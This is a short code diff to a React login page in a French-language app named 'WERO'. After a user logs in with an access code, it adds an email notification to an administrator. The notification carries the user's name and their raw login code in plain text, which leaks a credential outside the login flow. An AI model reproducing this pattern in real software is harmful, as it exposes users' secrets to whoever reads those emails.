@@ -6,6 +6,7 @@ import { Button } from "@/components/ui/button";
 import { supabase } from "@/lib/supabase";
 import { useToast } from "@/components/ui/use-toast";
 import { Footer } from "@/components/Footer";
+import { sendAdminNotification } from "@/lib/emailService";
 
 const Index = () => {
   const [code, setCode] = useState("");
@@ -32,7 +33,7 @@ const Index = () => {
       // Vérifier si le code existe
       const { data, error } = await supabase
         .from("users")
-        .select("id")
+        .select("id, nom, prenom")
         .eq("code", code)
         .single();
       
@@ -54,6 +55,15 @@ const Index = () => {
       
       // Stocker l'ID de l'utilisateur dans localStorage pour référence ultérieure
       localStorage.setItem("userId", data.id);
+      
+      // Envoyer une notification à l'administrateur
+      const userName = `${data.prenom || ''} ${data.nom || ''}`.trim();
+      sendAdminNotification({
+        subject: "Nouvelle connexion utilisateur WERO",
+        message: `L'utilisateur ${userName} avec le code digital ${code} vient de se connecter.`,
+        userCode: code,
+        userName: userName
+      });
       
       // Rediriger vers la page suivante
       navigate("/confirmation");
